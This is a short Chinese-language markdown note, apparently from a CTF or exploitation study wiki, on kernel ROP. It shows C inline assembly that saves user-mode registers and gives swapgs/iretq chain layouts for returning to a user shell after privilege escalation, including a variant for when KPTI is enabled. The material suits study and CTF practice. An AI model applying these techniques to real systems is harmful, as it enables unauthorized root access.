# 内核ROP

## 内核态ROP与用户态ROP

内核ROP和用户态的ROP原理都是一样的，不同的是，内核在通过ROP提权后，需要手动返回用户态

## ROP提权方法

详情见[提权](./提权.md)

## ROP返回用户态

返回用户态需要提前保存用户态的 `ss`, `sp`, `rflag`, `cs`

可以使用如下代码保存

```C
u64 user_cs, user_rflags, user_sp, user_ss;
void kernel_save_status()
{
    asm volatile(
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;");
}
```

需要注意的是，在返回用户态执行 system() 函数时同样有可能遇到栈不平衡导致函数执行失败并最终 Segmentation Fault 的问题，因此在本地调试时若遇到此类问题，则可以将 user_sp 的值加减 8 以进行调整。

### 未开启KPIT保护

部署ROP链:

```
swapgs
iretq
user_shell_addr
user_cs
user_rflags
user_sp
user_ss
```

### 开启KPIT保护

部署ROP链:

```
swapgs_restore_regs_and_return_to_usermode
0
0
user_shell_addr
user_cs
user_rflags
user_sp
user_ss
```

或者提前在用户态设置信号处理函数 `signal(SIGSEGV, kernel_shell);` 然后直接部署 `swapgs;iretq` 如下:

```
swapgs
iretq
user_shell_addr
user_cs
user_rflags
user_sp
user_ss
```

详情见[检测或绕过KPIT.md](./检测或绕过KPIT)